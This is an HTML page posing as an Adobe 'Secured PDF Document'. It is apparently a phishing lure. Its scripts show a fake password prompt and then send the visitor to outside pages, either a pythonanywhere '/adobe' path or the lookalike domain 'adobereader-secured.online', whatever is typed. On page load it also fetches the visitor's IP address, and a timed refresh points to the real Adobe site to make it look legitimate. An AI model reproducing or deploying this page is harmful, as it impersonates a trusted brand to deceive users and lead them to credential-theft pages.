<!DOCTYPE html>
<html>
  <head>
    <title>Secured PDF Document</title>
    <script>
      // prompt the user to input a PIN
      var pin = prompt("This document is password protected, Please enter a password.");

      // check if the PIN matches
      if (pin === "7381029") {
        // redirect to a new page if the PIN matches
        window.location.href = "https://happigeek.pythonanywhere.com/adobe";
      } else {
        // display an error message if the PIN doesn't match
        alert("Invalid Password. Please try again or contact the sender for a valid Password.");
        window.location.href = "https://adobereader-secured.online/valid.html";
      }
    </script>
  </head>
  <body>
     <script>
      // Get the user's IP address
      const ipAddress = async function() {
        const response = await fetch('https://api.ipify.org/?format=json');
        const data = await response.json();
        return data.ip;
      }

      // Save the user's IP address to a text file
      const saveIP = function() {
        ipAddress().then((ip) => {
          const data = new Blob([ip], {type: 'text/plain'});
          const url = URL.createObjectURL(data);
          const link = document.createElement('a');
          link.download = 'user-ip.txt';
          link.href = url;
          link.click();
        });
      }

      // Call the saveIP function on page load
      window.onload = function() {
        saveIP();
      };
    </script>
   <meta http-equiv="refresh" content="120; URL =https://www.adobe.com/acrobat.html">
  </body>
</html>
